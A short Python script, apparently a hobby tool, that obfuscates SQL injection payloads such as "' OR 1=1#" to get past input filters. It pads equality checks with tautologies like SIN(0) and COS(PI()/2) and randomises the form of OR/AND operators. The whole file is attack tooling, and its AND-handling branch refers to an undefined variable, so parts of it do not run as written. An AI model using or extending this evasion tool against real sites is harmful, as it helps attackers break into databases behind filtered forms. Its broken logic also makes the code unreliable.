import sys
import random

print()

print("Begin Obfuscator")

SQLcommands = ['\' OR 1=1#']

def modifyEquality(string):
    sides=string.split("=")
    listOfTauts= ['0','2/2-1','8-8','COS(PI()/2)','SIN(0)']
        
    for j in range(len(sides)):
        repetitions=random.randint(2,5)#arbitraryMaxes
       
        for i in range(repetitions):
            index = random.randint(0,len(listOfTauts)-1)
            frontBool= random.randint(0,1)
            if(frontBool):
                sides[j]=listOfTauts[index]+"+"+sides[j]
            else:
                sides[j]=sides[j]+"+"+listOfTauts[index]
   
    #Randomly select value
    return str( sides[0]+"=" +sides[1])
    
def changeLogicOperations (string): #Randomly chooses between written and signs, and adds extra meaningless extensions.
    orValues=["OR","Or","or","oR","||"]
    andValues=["AND","aNd","And","aND","and","&&"]
    
    for element in orValues:
        if (element in string):
            print("FoundElement")
            p1, sep, p2 = string.partition(element)
            whichString=random.randint(0,len(orValues)-1)
            string=p1+orValues[whichString]+p2
            #Put useless or terms here
            
            
    for element in andValues:
        if (element in string):
            print("FoundElement")
            p1, sep, p2 = str1.partition(element)
            whichString=random.randint(0,len(orValues)-1)
            string=p1+andValues[whichString]+p2
                
    return string
    
def obfuscateCommand(string):
    sections=string.split("\'")
    output = ""
    for i in range(len(sections)):
        
        sections[i]=changeLogicOperations(sections[i])
       
        if(i%2==1):
            loopTemp=""
            terms=sections[i].split(" ")
            print(terms)
            for term in terms:
                removedHash = term
                postHash=""
                if("#" in removedHash):
                    removedHash, sep, postHash = removedHash.partition("#")
                    postHash="#"+postHash
                    
                if ("=" in removedHash):
                    print("Term is "+str(removedHash))
                    loopTemp+=" "+str(modifyEquality(removedHash))+postHash
                else:
                    loopTemp+=removedHash +postHash
        else:
            loopTemp=str(sections[i])
            
        if(i<len(sections)-1):   
            loopTemp+="\'"
        output+=loopTemp
    #Add meaningless extra spaces?

    
    #COUNT How many open and close quotes (And ignore escaped characters.)
    
    openQuotes = sum(1 for i in range(len(output)) 
        if output.startswith("\'", i))
    escapedQuotes = sum(1 for i in range(len(output)) 
        if output.startswith("\\\'", i))
        
    if((openQuotes-escapedQuotes)%2==1):
        output+=""#USED TO BE # . I keep for the counting above.
    return output
    
    
print(random.randint(0,1))
outputCommand = obfuscateCommand(sys.argv[1])

print(outputCommand)